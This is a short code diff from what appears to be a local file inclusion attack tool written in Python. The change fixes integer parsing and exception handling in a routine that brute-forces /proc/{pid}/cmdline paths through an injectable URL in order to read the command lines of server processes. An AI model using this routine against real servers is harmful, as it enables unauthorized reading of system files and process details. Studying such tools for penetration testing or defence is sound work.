@@ -89,12 +89,12 @@ def interrogate(injectable, filter_mode, suffix, repeat_prefix, decoder):
                 proc_bf_range = filepath.split("lpbf:")[1]
                 try:
                     proc_bf_st, proc_bf_end = proc_bf_range.split(",")
-                    target_range = range(proc_bf_st, proc_bf_end + 1)
+                    target_range = range(int(proc_bf_st), int(proc_bf_end) + 1)
                     for procid in target_range:
                         target = f"{injectable}{injection_prefix}/proc/{procid}/cmdline"
                         click.secho(f"{Fore.LIGHTCYAN_EX}-------------------------{Fore.WHITE}/proc/{procid}/cmdline{Fore.LIGHTCYAN_EX}-------------------------")
                         handle_lfi_request(target, decoder)
-                except:
+                except Exception as ex:
                     click.secho(f"{Fore.LIGHTRED_EX} [LPBF] Invalid path bruteforce range specified. try: 'lpbf:1,1000' for proc/1 to proc/1000")
             else:
                 # Prepare full url
